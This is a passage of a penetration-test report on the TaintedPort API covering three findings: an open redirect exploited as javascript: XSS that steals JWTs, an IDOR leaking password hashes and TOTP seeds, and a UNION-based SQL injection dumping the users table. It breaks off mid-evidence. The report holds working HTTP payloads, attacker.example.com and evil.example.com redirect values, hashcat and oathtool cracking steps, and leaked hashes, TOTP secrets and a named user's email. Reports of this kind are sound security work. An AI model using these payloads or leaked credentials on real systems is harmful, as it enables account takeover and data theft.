{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozNzQsImVtYWlsIjoicmVjb24tMmUzNTRjOTVAZXhhbXBsZS5jb20iLCJpc19hZG1pbiI6ZmFsc2UsImlhdCI6MTc4NDU0Nzc2NywiZXhwIjoxNzg1MTUyNTY3fQ.OrfPcyYD5BDHp2748_JcBT8C4-5uVqNJ6ZhO_aqncAY","user":{"id":374,"name":"Recon Scanner","email":"victim@example.com","is_admin":false},"redirect_url":"javascript:alert(document.domain)"}
```


> The API accepts the undocumented `redirect` field and reflects it byte-for-byte as `redirect_url` on a successful login. No scheme or host validation is performed.



**2. Server also reflects `https://` external, `data:`, `//`, and relative paths**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"victim@example.com","password":"<pw>","redirect":"https://attacker.example.com/collect"}

---

POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"victim@example.com","password":"<pw>","redirect":"data:text/html,<h1>x</h1>"}

---

POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"victim@example.com","password":"<pw>","redirect":"//evil.example.com/"}
```

*Response:*
```http
HTTP/1.1 200 OK  ->  "redirect_url":"https://attacker.example.com/collect"
HTTP/1.1 200 OK  ->  "redirect_url":"data:text/html,<h1>x</h1>"
HTTP/1.1 200 OK  ->  "redirect_url":"//evil.example.com/"
```


> The `redirect_url` field is echoed unchanged for every scheme tried. Confirms the absence of any allowlist or sanitisation on the server side.



**3. Frontend delivery - attacker-crafted URL**

*Request:*
```http
GET /login?redirect=javascript%3Adocument.title%3D%22PWNED_%22%2Bdocument.domain%2B%22_TOKEN_%22%2BlocalStorage.getItem(%22token%22).slice(0%2C40) HTTP/1.1
Host: taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Powered-By: Next.js

<!-- (no Content-Security-Policy, no X-Frame-Options) Login SPA page. The React client reads `?redirect=` from the URL, forwards it in the POST /auth/login body, then runs `window.location.href = response.redirect_url` on success. -->
```


> The delivery page is on the legitimate `taintedport.com` origin over the real TLS certificate. `taintedport.com` emits no CSP or X-Frame-Options header, so nothing blocks a subsequent `javascript:` navigation via `location.href`.



**4. Sink execution - same-origin XSS + JWT theft**

*Request:*
```http
(inside the login page after the user submits real credentials, the React handler executes:)

window.location.href = "javascript:document.title='PWNED_'+document.domain+'_TOKEN_'+localStorage.getItem('token').slice(0,40)";
```

*Response:*
```http
document.domain      = "taintedport.com"
document.body.textContent = "PWNED_taintedport.com_TOKEN_eyJhbGciOiJIUzI1NiIsInR5cCI6Ik"
localStorage.token   = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozNzQsImVtYWlsIjoicmVjb24tMmUzNTRjOTVAZXhhbXBsZS5jb20iLCJpc19hZG1pbiI6ZmFsc2UsImlhdCI6MTc4NDU0NzU5MSwiZXhwIjoxNzg1MTUyMzkxfQ._3aOfWoxMqG4dsO1Wyr2XInzlP81YICf1X5g5hTsUCo"
```


> Playwright-driven Chromium confirmed the payload ran in the taintedport.com origin and successfully read the 7-day JWT from localStorage. Screenshot: evidence/01-xss-triggered.png. In a real attack the payload would fetch()-exfiltrate the token silently and hand control back to /wines so the victim notices nothing.





#### Remediation

Server-side (POST /auth/login):
1. Preferred: remove the `redirect` field from the login endpoint entirely. The frontend can navigate to a fixed post-login route (e.g., `/wines`) with no server participation.
2. If a per-request post-login destination is genuinely needed, validate strictly on the server:
   - Parse the value with a standards-compliant URL parser.
   - Require the value to be a relative path beginning with `/` and to match a conservative allowlist regex such as `^/[A-Za-z0-9/_\-]{0,200}$`.
   - Reject leading `//` or `/\\` (protocol-relative), `javascript:`, `data:`, `file:`, `vbscript:`, `blob:`, and any URL containing `:`, `@`, `#`, `?`, or backslashes unless explicitly required and separately validated.
   - Do not echo the value back if it fails validation; return `redirect_url` as null/absent rather than the untrusted input.

Client-side (/login page):
3. Replace `window.location.href = response.redirect_url` with `router.push(response.redirect_url)` (Next.js router — it will refuse cross-origin and non-path values) or manually validate before navigating: only allow values matching `^/[A-Za-z0-9/_\-]{0,200}$`; explicitly reject any value whose parsed origin differs from `window.location.origin`.
4. Never trust `redirect_url` to be safe just because it came from the API — the API can be reached directly and its response can be arbitrarily influenced by the same URL that reaches the login page.

Defense in depth:
5. Emit a strict `Content-Security-Policy` on all pages under `taintedport.com`, e.g.
   `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';`
   A CSP without `'unsafe-inline'` blocks the `javascript:` navigation vector even if either of the above validations regresses.
6. Move the JWT out of `localStorage` and into a cookie set with `HttpOnly; Secure; SameSite=Strict`. This makes token theft impossible via any XSS-shaped primitive.
7. Implement a real server-side logout / revocation mechanism (denylist, or short-lived access tokens with refresh) so a stolen token can be invalidated.
8. Add hardening headers: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`.

Testing:
9. Add regression tests asserting that `POST /auth/login` with each of the following `redirect` values returns without a `redirect_url` field (or with a null value): `javascript:1`, `data:text/html,x`, `//evil.tld/`, `https://evil.tld/`, `/\\evil.tld/`, `/foo?next=javascript:1`.

---


### vuln-0003: Horizontal IDOR on GET /orders/{id} exposes any user's email, bcrypt password hash, TOTP secret, and admin flag










**Severity:** HIGH | **CVSS:** 7.7 | **Endpoint:** `/orders/{id}` | **Method:** GET | **CWE:** CWE-639 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`

#### Description

The order-detail endpoint `GET /orders/{id}` performs no object-level authorization check. Any authenticated caller — including a freshly self-registered attacker — can retrieve any order in the system by iterating its numeric identifier, and the response body embeds sensitive owner fields (`owner_name`, `owner_email`, `owner_password_hash`, `owner_totp_secret`, `owner_is_admin`) that belong to the order's actual owner rather than the caller.

Order identifiers are strictly sequential auto-increment integers, self-registration is open (no email verification, no CAPTCHA, no rate-limiting observed for 100+ back-to-back requests), and the only precondition for exploitation is possession of any valid bearer token — which an unauthenticated attacker can mint in a single request. Enumerating the id space therefore yields the bcrypt password hash of every user who has ever placed an order, together with the base32 TOTP secret of every 2FA-enabled account. Independent testing confirmed both leak vectors: order id 119 disclosed the hash and TOTP seed of user 373 (`luis.grangeia@snyk.io`), while order id 17 disclosed the hash and TOTP seed of the 2FA-enabled fixture user 28. Control requests (`/orders/9999999` → 404, `/orders/119` without a token → 401) confirm that authentication is enforced and that the row-not-found path is distinct from the row-disclosed path, so the leak is unambiguously an authorization failure rather than an error-page artefact.

Two independent security failures compound:
1. **CWE-639 — Broken Object Level Authorization.** The SQL query resolving the requested order is not scoped by `WHERE user_id = <jwt.user_id>`, and no post-fetch ownership check is applied.
2. **CWE-200 — Excessive data exposure.** The response serializer projects internal `users`-table columns (`password_hash`, `totp_secret`, `is_admin`) into the order payload as `owner_*` fields. These have no legitimate purpose in a customer-facing order response even for the correct owner.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│         HORIZONTAL IDOR — GET /orders/{id}  (CWE-639 + CWE-200)      │
└──────────────────────────────────────────────────────────────────────┘

  Prerequisites:
    • Open self-registration (no email verification, no CAPTCHA)
    • Order ids are sequential auto-increment integers
    • No per-request ownership check in the /orders/{id} handler
    • No rate limiting on /orders/{id}

  ┌───────────┐                              ┌──────────────────────────┐
  │  Attacker │                              │   api.taintedport.com    │
  │ (no acct) │                              │  ┌────────────────────┐  │
  └─────┬─────┘                              │  │ orders table       │  │
        │                                    │  │  id, user_id, …    │  │
        │  [1] POST /auth/register           │  └────────┬───────────┘  │
        │      {name,email,password}         │           │ JOIN users   │
        │───────────────────────────────────▶│           ▼              │
        │◀───── 200 {token, user_id=421} ────│  ┌────────────────────┐  │
        │                                    │  │ users table        │  │
        │                                    │  │  email,            │  │
        │                                    │  │  password_hash,    │  │
        │                                    │  │  totp_secret,      │  │
        │                                    │  │  is_admin          │  │
        │                                    │  └────────────────────┘  │
        │                                    └──────────────────────────┘
        │
        │  [2] GET /orders/119                (attacker JWT: user_id=421)
        │      Authorization: Bearer <attacker>
        │───────────────────────────────────────────────▶
        │
        │            ┌────────────────────────────────┐
        │            │ Handler:                       │
        │            │   SELECT * FROM orders o       │
        │            │   JOIN users u ON o.user_id=u.id
        │            │   WHERE o.id = :id             │
        │            │   ↑ no AND o.user_id=:caller   │
        │            │   ↑ no ownership check         │
        │            └────────────────────────────────┘
        │
        │◀────── 200 OK ──────────────────────────────────
        │        {
        │          "user_id": 373,                  ← belongs to victim
        │          "owner_email": "luis.grangeia@snyk.io",
        │          "owner_password_hash": "$2y$10$UaebUU1lw…",  ⚠ bcrypt
        │          "owner_totp_secret":  "JBSWY3DPEHPK3PXP",    ⚠ 2FA seed
        │          "owner_is_admin":     0
        │        }
        │
        │  [3] Loop id = 1..N  →  harvest every user's hash + TOTP + admin
        │
        ▼
  ┌───────────────────────────────────────────────────────────────┐
  │ OFFLINE                                                       │
  │  • hashcat -m 3200 against bcrypt hashes → password cracking  │
  │  • oathtool --totp -b <base32 seed>       → live 2FA bypass   │
  │  • filter owner_is_admin=1                → target admins     │
  └───────────────────────────────────────────────────────────────┘

  Controls (proving this is authorization, not error handling):
      GET /orders/9999999           → 404  "Order not found."
      GET /orders/119 (no token)    → 401  "Access denied. No token provided."

  Root cause (one line):
      /orders/{id} handler filters by id alone, and joins users.*
      into the response as owner_* — including password_hash, totp_secret,
      and is_admin.
```


#### Impact

An unauthenticated network attacker can, in a single-digit number of minutes, exfiltrate cross-account credential material for every customer who has ever placed an order:

- **Offline password cracking of the entire customer base** — the bcrypt `$2y$10$…` hash of every order-owner is disclosed verbatim, feeding directly into hashcat/john dictionary and mask attacks against weak or reused passwords.
- **Two-factor authentication bypass** — for every 2FA-enabled victim, the raw base32 TOTP seed is returned in the response, allowing the attacker to generate valid 6-digit codes at will and defeat the app's MFA layer.
- **Admin discovery and pre-positioning** — the `owner_is_admin` flag disclosed on every response makes it possible to identify privileged accounts with a single enumeration pass. Any admin who has placed or later places an order immediately becomes a high-value target whose hash + TOTP seed can be lifted and cracked offline — a direct path to full administrative takeover of the platform.
- **Personal data / regulatory exposure** — the full name and login email of every customer are exfiltrable at scale, constituting a bulk PII breach under GDPR.

During validation, a single 20-request scan by a net-new user harvested 20 bcrypt hashes and one live base32 TOTP seed across four distinct victim accounts. The identifier space is small, sequential, and unbounded, so the whole customer database is reachable in a linear scan.

#### Technical Analysis

Root cause is a missing WHERE clause in the order-detail data-access path combined with a serializer that joins the owning user row into the response.

1. **Missing object-level authorization (BOLA / CWE-639).** The handler for `GET /orders/{id}` looks up the row by the path parameter alone. There is no `AND user_id = :caller_id` predicate, no post-fetch ownership check, and no role branch (admin vs. owner). Any bearer token that authenticates successfully is treated as authorised to read any row.

2. **Sensitive column projection (CWE-200).** The response is built from a JOIN across `orders` and `users`, and the users columns `password_hash`, `totp_secret`, and `is_admin` are surfaced as `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin` — apparently because the checkout UI uses `owner_name`/`owner_email` to render "Your Order" and the whole owner row was pulled in as a convenience. There is no output DTO / allow-list; adding columns to `users` will automatically leak them here.

3. **No compensating controls.** Authentication is enforced (401 without a token) and the row-not-found path is honest (404 for out-of-range ids), so the 200 responses observed for arbitrary ids are unambiguously the result of the missing authorization check. Registration is open and rate limiting was not observed for 100+ back-to-back requests, so the "any authenticated caller" precondition is effectively equivalent to "any network attacker".

4. **Enumeration is trivial.** Order ids are sequential auto-increment integers, so a simple `for id in range(1, N)` linear scan reaches every row; no side-channel or discovery step is needed.

Reproduction was performed with a fresh account created solely for validation (user_id 421 / 430 / 431 across runs), and the leaked material for orders 1, 17, and 119 belongs to unrelated user_ids 1, 28, and 373 respectively.


#### Proof of Concept


1. Register a fresh attacker account with `POST /auth/register {"name":"…","email":"…","password":"…"}`; the response returns a JWT immediately (no email verification).
2. As that attacker, request an arbitrary order id you do not own: `GET /orders/119` with `Authorization: Bearer <token>`.
3. Observe HTTP 200 with a body that includes `"user_id":373`, `"owner_email":"luis.grangeia@snyk.io"`, `"owner_password_hash":"$2y$10$UaebUU1lw…"`, `"owner_totp_secret":"JBSWY3DPEHPK3PXP"`, `"owner_is_admin":0`.
4. Repeat for other ids (e.g. `/orders/17` returns the TOTP-enabled fixture user's seed `J24ZJCUQDVK47IKELZ6AZ2FHLHD7KQSJ` and its bcrypt hash). Any `id` value in the auto-increment range yields the corresponding owner's credential material.
5. Confirm the controls: `/orders/9999999` returns 404 ("Order not found."), and the same request without an `Authorization` header returns 401 ("Access denied. No token provided."). These prove the 200 responses are authorization failures rather than error-page or wildcard behaviour.

The bundled PoC script (`poc.py`) automates steps 1–4, prints coloured evidence, and saves the disclosed rows to `evidence/disclosed_orders.json`. `verify.py` is a minimal boolean regression test that exits 0 while the endpoint remains vulnerable and 1 once ownership is enforced.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Self-register a fresh attacker (no prior standing, no email verification)**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"ValidatorTest2","email":"validator2-1784547529@example.com","password":"Validate!2test-99"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"eyJhbGciOiJIUzI1NiIs...user_id=421...","user":{"id":421,"name":"ValidatorTest2","email":"validator2-1784547529@example.com","is_admin":false}}
```


> Registration is open and returns a usable JWT immediately, giving the attacker the low-privileged bearer needed for step 2.



**2. Attacker (user_id=421) requests order id=119 owned by user_id=373**

*Request:*
```http
GET /orders/119 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...user_id=421...
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":119,"user_id":373,"total":1,"status":"pending","shipping_name":"Recon","shipping_city":"Lisboa","created_at":"2026-07-20 11:25:10","owner_name":"Luis Grangeia","owner_email":"luis.grangeia@snyk.io","owner_password_hash":"$2y$10$UaebUU1lw.Wy0MTZMp1pkOMS1zdr/Ve51KvR4HoFavuaMRHWf8eqK","owner_totp_secret":"JBSWY3DPEHPK3PXP","owner_is_admin":0,"items":[...]}}
```


> Attacker's JWT (user_id=421) is used to read an order whose owner is user_id=373. The response body includes the owner's bcrypt password hash and base32 TOTP secret — credential material that has no legitimate place in an order response.



**3. Same attacker reads order id=17 belonging to the TOTP-enabled test user (user_id=28)**

*Request:*
```http
GET /orders/17 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker-token>
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":17,"user_id":28,"owner_email":"totpvictim_infodisclosure@taintedport.test","owner_password_hash":"$2y$10$zPbVF6Eof060W.C58F4P/e...","owner_totp_secret":"J24ZJCUQDVK47IKELZ6AZ2FHLHD7KQSJ","owner_is_admin":0}}
```


> A second victim account with 2FA enabled — the base32 seed leaks in full, allowing the attacker to derive valid 6-digit TOTP codes at any time. Every 200 for a non-owned order id is a full credential disclosure event.



**4. Control — non-existent id returns 404 (proves 200 leaks are authorization-based, not error-based)**

*Request:*
```http
GET /orders/9999999 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker-token>
```

*Response:*
```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{"success":false,"message":"Order not found."}
```


> The endpoint DOES distinguish 'row does not exist' (404) from 'row exists' (200), so the 200 responses in steps 2 and 3 are unambiguously authorization failures.



**5. Control — unauthenticated request is rejected (confirms 200 requires auth)**

*Request:*
```http
GET /orders/119 HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Access denied. No token provided."}
```


> Authentication IS enforced; only object-level authorization is missing — the classic BOLA / horizontal IDOR pattern.





#### Remediation

1. **Enforce object-level authorization on `GET /orders/{id}`.** Reject any request whose JWT `user_id` does not match the row's `user_id` (unless the caller has `is_admin=true`). Prefer query-scoping so a non-owner cannot even distinguish "wrong owner" from "not found": `SELECT * FROM orders WHERE id = :id AND (user_id = :caller_id OR :caller_is_admin)`. Return 404 (not 403) for the negative case to avoid confirming id existence.

2. **Stop leaking credential material in API responses.** Remove `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin` from every order response body — they have no client-side use even for the legitimate owner. Restrict the customer-facing payload to display-only fields (e.g. `owner_name`, and only to the owner or an admin).

3. **Introduce an explicit output DTO / serializer allow-list** for the order resource, driven by a whitelist of columns rather than a `SELECT * … JOIN users`. Any future column added to `users` will then not be exfiltrated automatically.

4. **Replace sequential integer ids with unguessable identifiers** (UUIDv4 or signed opaque ids) so that even if the authorization bug regresses, enumeration is no longer a straight `for id in 1..N`.

5. **Rate-limit `/orders/{id}` per authenticated principal** (e.g. 30 rpm/user) and alert on high 2xx-ratio scans of the endpoint.

6. **Audit adjacent endpoints** that follow the same pattern for owner-scoped reads — `GET /wines/{id}/reviews/{review_id}`, `GET /admin/orders/{id}`, and any other resource that ships an `owner_*` blob — for the same missing authorization check and the same credential-column exposure.

7. **Add regression coverage** for two invariants: (a) a user who does not own an order receives 404, and (b) no order response body ever contains the substrings `password_hash` or `totp_secret`.

8. **Rotate credentials for exposed users.** Every bcrypt hash and TOTP seed reachable via `/orders/{id}` should be treated as compromised: force a password reset for all affected accounts and re-provision TOTP secrets for every 2FA-enabled user whose seed may have been disclosed.

---


### vuln-0016: UNION-Based SQL Injection in GET /wines/{id} Path Parameter (Unauthenticated Full Database Read)










**Severity:** HIGH | **CVSS:** 7.5 | **Endpoint:** `/wines/{id}` | **Method:** GET | **CWE:** CWE-89 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

#### Description

The numeric `{id}` path segment of `GET /wines/{id}` on the TaintedPort API is interpolated directly into a raw SQLite `SELECT ... FROM wines WHERE id = <INPUT>` query with no integer cast and no parameterised binding. An unauthenticated attacker can therefore inject arbitrary SQL, and because the underlying SELECT projects 15 columns whose values are copied verbatim into the JSON `wine` object of the response, the attacker obtains a fully in-band, "one request = one row" read primitive against the entire application database. The same code pattern is present at `GET /wines/{id}/reviews`, which provides a matching numeric-context boolean oracle (visible extraction is only limited by that endpoint's response schema).

Direct testing confirms extraction of the SQLite version, the full list of application tables (`users, wines, cart_items, orders, order_items, reviews, sqlite_sequence`), and — after registering a throwaway test account — of that account's own bcrypt `password_hash` returned inside the wine-lookup JSON response. The same primitive trivially exposes every row of every table, including bcrypt password hashes and cleartext TOTP secrets for all users, order data with customer PII, and shipping addresses.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│  UNION-Based SQL Injection — GET /wines/{id}                         │
│  Target: https://api.taintedport.com   (unauthenticated)             │
└──────────────────────────────────────────────────────────────────────┘

  Attacker (no creds)                Web app (PHP 8.2)          SQLite 3.51.2
   │                                       │                          │
   │ ① GET /wines/1                        │                          │
   │──────────────────────────────────────▶│                          │
   │                                       │  SELECT … WHERE id=1     │
   │                                       │─────────────────────────▶│
   │  { "wine": { "id":1,"name":"…" }}     │◀───── row 1 ─────────────│
   │◀──────────────────────────────────────│                          │
   │                                       │                          │
   │ ② GET /wines/2 AND 5=6   (boolean)    │                          │
   │──────────────────────────────────────▶│  WHERE id=2 AND 5=6      │
   │  { "success": false }                 │─────────────────────────▶│
   │◀──────────────────────────────────────│◀── 0 rows ──             │
   │                                       │                          │
   │ ③ GET /wines/0 UNION SELECT           │                          │
   │       101,102,…,115         (probe)   │                          │
   │──────────────────────────────────────▶│  UNION SELECT 101..115   │
   │  wine.id=101, wine.name=102, …        │─────────────────────────▶│
   │  wine.created_at=115                  │◀── injected row ─────────│
   │◀──────────────────────────────────────│  (15 cols reflected)     │
   │                                       │                          │
   │ ④ GET /wines/0 UNION SELECT           │                          │
   │       1,sqlite_version(),3,…,15       │                          │
   │──────────────────────────────────────▶│──────────────────────────▶│
   │  wine.name = "3.51.2"                 │◀─── SQLite version ──────│
   │◀──────────────────────────────────────│                          │
   │                                       │                          │
   │ ⑤ GET /wines/0 UNION SELECT           │                          │
   │       1,group_concat(name),…          │                          │
   │       FROM sqlite_master              │                          │
   │──────────────────────────────────────▶│──────────────────────────▶│
   │  wine.name = "users,orders,           │◀── full table list ──────│
   │               order_items,reviews,…"  │                          │
   │◀──────────────────────────────────────│                          │
   │                                       │                          │
   │ ⑥ POST /auth/register  (ROE: own acct)│                          │
   │──────────────────────────────────────▶│  INSERT INTO users …     │
   │  user_id=478 created                  │─────────────────────────▶│
   │◀──────────────────────────────────────│                          │
   │                                       │                          │
   │ ⑦ GET /wines/0 UNION SELECT           │                          │
   │       id,name,email,password_hash,…   │                          │
   │       FROM users                      │                          │
   │       WHERE email="validator20+…"     │                          │
   │──────────────────────────────────────▶│──────────────────────────▶│
   │  wine.type = "$2y$10$hjYb75P1qoRG…"   │◀── bcrypt hash ──────────│
   │◀──────────────────────────────────────│                          │
   │  ▶ ARBITRARY READ of the users        │                          │
   │    table (password_hash, totp_secret, │                          │
   │    is_admin, etc.) confirmed          │                          │
   │                                       │                          │

Root cause
──────────
  $id (path param) is interpolated raw into SQL:
     SELECT * FROM wines WHERE id = <INPUT>
  No (int) cast · no prepared statement · no router-level regex.

Prerequisites
─────────────
  • Network access to api.taintedport.com (port 443).
  • None else — no credentials, no user interaction, no chaining.

Blast radius (same primitive)
─────────────────────────────
  • Dump every user's bcrypt hash        → offline password cracking
  • Dump every user's totp_secret        → permanent 2FA bypass
  • Dump orders/order_items              → customer PII, addresses
  • Dump reviews / cart_items / secrets  → full DB read
  • Chain with POST /auth/login SQLi     → instant admin JWT
```


#### Impact

A network attacker with no credentials and no user interaction can read arbitrary rows from any table in the application database via a single GET request. Concretely, the following are exposed:

- `users.password_hash` — bcrypt hashes for every user; enables offline cracking of every account, including administrative accounts.
- `users.totp_secret` — stored in cleartext, permanently bypassing any 2FA protection once dumped.
- `users.email`, `users.name`, `users.is_admin` — full enumeration of the user population and privilege markers.
- `orders`, `order_items` — customer PII, shipping addresses, phone numbers, purchase history.
- Any additional secrets stored in the SQLite database.

The read primitive is unauthenticated, in-band (no OOB channel needed), fast (one request per row), and self-describing (schema is discoverable through `sqlite_master`). Combined with the sibling `POST /auth/login` SQL injection finding, or by cracking any weak bcrypt password offline, the attacker escalates to full application takeover including the administrator role.

#### Technical Analysis

Root cause: the wine-lookup handler concatenates the raw `{id}` path parameter into a SQLite query of the form `SELECT id, name, region, type, vintage, price, image_url, description, description_short, grapes, alcohol, bottle_size, producer, food_pairing, created_at FROM wines WHERE id = <INPUT>`. There is no `(int)` cast, no `preg_match('/^\d+$/', $id)` guard, and no prepared-statement binding.

The injection has three characteristics that make it maximally exploitable:

1. **Numeric context** — the input lands directly after `=`, so no quote-breaking is required. The router forwards the entire remainder of the path segment (spaces, keywords, sub-selects) to the SQL layer.
2. **In-band reflection** — the executed SELECT projects exactly 15 columns and the handler copies each column positionally into the response JSON (`id → wine.id`, `name → wine.name`, ..., `created_at → wine.created_at`). Any expression the attacker places in `UNION SELECT <15 expressions>` is therefore returned verbatim, giving one-shot arbitrary read of any value.
3. **No comment tail needed** — the injected `UNION SELECT ...` naturally consumes the remainder of the outer query; SQLite also accepts double-quoted string literals (`"users"`), so payloads do not need to break out of single quotes or terminate with `--`.

Confirmed steps (payloads mine, not the tester's):

- Boolean oracle: `GET /wines/2 AND 2=2` returns wine id=2; `GET /wines/2 AND 5=6` returns `{"success":false,"message":"Wine not found."}`.
- Column count: `GET /wines/0 UNION SELECT 101,102,...,115` returns a 200 with every integer echoed into the corresponding JSON field, proving 15 projected columns and full positional reflection.
- DBMS fingerprint: `GET /wines/0 UNION SELECT 1,sqlite_version(),3,4,...,15` returns `wine.name = "3.51.2"`.
- Schema disclosure: `GET /wines/0 UNION SELECT 1,group_concat(name),3,...,15 FROM sqlite_master WHERE type="table"` returns `"users,sqlite_sequence,wines,cart_items,orders,order_items,reviews"`.
- Row exfiltration: after registering my own throwaway account (`validator20+poc<ts>@example.com`, user_id 478), `GET /wines/0 UNION SELECT id,name,email,password_hash,is_admin,totp_secret,totp_enabled,8,...,14,created_at FROM users WHERE email="validator20+poc1784548486@example.com"` returned `wine.type = "$2y$10$hjYb75P1qoRG2fuH00REReP/A9IYngmpM.aoypnj3Y6nWNmGQlMiu"` — the real bcrypt hash of that account, dumped through a wine endpoint.

The sibling `GET /wines/{id}/reviews` handler shares the same numeric-context WHERE: `GET /wines/1 AND 2=2/reviews` returns the review list, `GET /wines/1 AND 5=6/reviews` returns an empty array. Visible UNION-based extraction there is bounded by the reviews response schema, but a boolean oracle for blind extraction is fully usable.

The backend is SQLite 3.51.2 running under PHP 8.2 as fingerprinted from prior recon.


#### Proof of Concept


Prerequisites: none — the endpoint is reachable unauthenticated. All the following are single GET requests to `https://api.taintedport.com`.

1. Baseline: `GET /wines/1` → HTTP 200, real wine object.
2. Boolean oracle demonstrating numeric-context WHERE injection:
   - `GET /wines/2%20AND%202=2` → HTTP 200, wine id=2 returned.
   - `GET /wines/2%20AND%205=6` → HTTP 200, `{"success":false,"message":"Wine not found."}`.
3. Column count probe (15 projected columns):
   `GET /wines/0%20UNION%20SELECT%20101,102,103,104,105,106,107,108,109,110,111,112,113,114,115`
   → each integer is echoed into its positional JSON field.
4. DBMS fingerprint:
   `GET /wines/0%20UNION%20SELECT%201,sqlite_version(),3,4,5,6,7,8,9,10,11,12,13,14,15`
   → `wine.name = "3.51.2"`.
5. Full schema disclosure via `sqlite_master`:
   `GET /wines/0%20UNION%20SELECT%201,group_concat(name),3,4,...,15%20FROM%20sqlite_master%20WHERE%20type=%22table%22`
   → returns the complete table list.
6. Row-level exfiltration (ROE-compliant — register a throwaway account first, then read that same account's row):
   `POST /auth/register` with a fresh email, then
   `GET /wines/0%20UNION%20SELECT%20id,name,email,password_hash,is_admin,totp_secret,totp_enabled,8,9,10,11,12,13,14,created_at%20FROM%20users%20WHERE%20email=%22<url-encoded-email>%22`
   → the response's `wine.type` field contains the real bcrypt hash of the throwaway account.

The bundled `poc/poc.py` automates all six steps with per-step assertions and prints a "VULNERABILITY CONFIRMED" banner if the bcrypt hash is successfully extracted. The bundled `poc/verify.py` is a minimal regression check that exits 0 while the vulnerability is still exploitable.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Baseline — real wine row**

*Request:*
```http
GET /wines/1 HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wine":{"id":1,"name":"Quinta do Vallado Douro Tinto","region":"Douro","type":"Red","vintage":2020,...}}
```


> Establishes a known-good response shape (JSON wine object with 15 fields).



**2. Boolean oracle — TRUE**

*Request:*
```http
GET /wines/2%20AND%202=2 HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"wine":{"id":2,"name":"Pêra-Manca Branco",...}}
```


> 'AND 2=2' evaluates true so the wine is still returned — the id path segment lands inside a WHERE clause.



**3. Boolean oracle — FALSE**

*Request:*
```http
GET /wines/2%20AND%205=6 HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":false,"message":"Wine not found."}
```


> 'AND 5=6' evaluates false so no row matches — proves numeric-context injection into the WHERE.



**4. Column count probe (15 numeric values)**

*Request:*
```http
GET /wines/0%20UNION%20SELECT%20101,102,103,104,105,106,107,108,109,110,111,112,113,114,115 HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"wine":{"id":101,"name":102,"region":103,"type":104,"vintage":105,"price":106,"image_url":107,"description":108,"description_short":109,"grapes":110,"alcohol":111,"bottle_size":112,"producer":113,"food_pairing":114,"created_at":115}}
```


> Underlying SELECT has 15 columns, each is rendered positionally into the JSON wine object — full in-band read primitive.



**5. DBMS fingerprint — sqlite_version()**

*Request:*
```http
GET /wines/0%20UNION%20SELECT%201,sqlite_version(),3,4,5,6,7,8,9,10,11,12,13,14,15 HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"wine":{"id":1,"name":"3.51.2","region":3,...}}
```


> Backend confirmed as SQLite 3.51.2.



**6. Schema disclosure — list of tables from sqlite_master**

*Request:*
```http
GET /wines/0%20UNION%20SELECT%201,group_concat(name),3,4,5,6,7,8,9,10,11,12,13,14,15%20FROM%20sqlite_master%20WHERE%20type=%22table%22 HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"wine":{"id":1,"name":"users,sqlite_sequence,wines,cart_items,orders,order_items,reviews","region":3,...}}
```


> Every application table (including `users`) is discoverable — attacker can pivot to any table.



**7. Register throwaway account (ROE — own data only)**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"Validator20 PoC","email":"validator20+poc1784548486@example.com","password":"TestPass!123"}
```

*Response:*
```http
HTTP/1.1 201 Created

{"success":true,"user":{"id":478,"name":"Validator20 PoC","email":"validator20+poc1784548486@example.com","is_admin":false},"token":"eyJhbGciOi..."}
```


> Fresh test user id=478 created so we can prove row-level read without touching other users' data.



**8. Row exfiltration — own bcrypt hash via UNION SELECT on users**

*Request:*
```http
GET /wines/0%20UNION%20SELECT%20id,name,email,password_hash,is_admin,totp_secret,totp_enabled,8,9,10,11,12,13,14,created_at%20FROM%20users%20WHERE%20email=%22validator20%2Bpoc1784548486%40example.com%22 HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
